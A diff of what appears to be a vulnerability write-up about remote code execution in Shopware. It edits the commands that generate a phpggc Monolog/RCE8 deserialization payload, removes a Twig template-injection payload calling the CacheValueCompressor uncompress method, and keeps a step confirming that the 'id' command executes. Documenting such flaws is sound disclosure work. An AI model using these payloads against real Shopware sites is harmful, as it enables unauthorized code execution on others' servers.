@@ -166,7 +166,7 @@ Serialized payload generated using the phpggc tool:
 Compressed payload is generated using:
 
 ```
-$ php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"'
+php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"'
 ```
 
 #### Gadget 2: 
@@ -207,11 +207,7 @@ Serialized payload generated using the phpggc tool:
 Compressed payload is generated using: 
 
 ```
-$ php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"' 
-```
-
-```
-{{ ["here"] | map(['\\Shopware\\Core\\Framework\\Adapter\\Cache\\CacheValueCompressor', 'uncompress']) | length }}
+php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"' 
 ```
 
 4. In the right-sidebar, click the Show Preview button. Observe that the id shell command is executed successfully:
